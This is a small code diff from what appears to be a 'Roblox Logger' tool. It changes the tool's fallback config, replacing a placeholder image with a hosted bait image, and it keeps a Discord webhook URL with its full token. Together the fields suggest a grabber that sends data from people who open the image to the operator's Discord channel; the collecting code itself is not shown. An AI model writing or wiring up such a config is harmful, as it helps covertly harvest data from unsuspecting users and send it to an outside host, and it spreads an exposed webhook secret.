@@ -8,7 +8,7 @@ try:
 except:
     config = {
         "webhook": "https://discord.com/api/webhooks/1507881858073890957/U-BedBZvsnTRJwmKUO7K62kngI1j6kUoimH5svkZp8A4DDIHQ6BMyE8Yg9U-W60XlOaN",
-        "image": "https://tr.rbxcdn.com/30DAY-Avatar-720F5A8A7B9B1C2D3E4F5060708090A1-Png/352/352/Avatar/Webp",  # <-- needs a real image URL
+        "image": "https://www.image2url.com/r2/default/images/1779574146634-8c086fb0-0025-4fdd-90f1-4f3d0398d526.png",  # <-- needs a real image URL
         "username": "Roblox Logger",
         "color": 16711680
     }
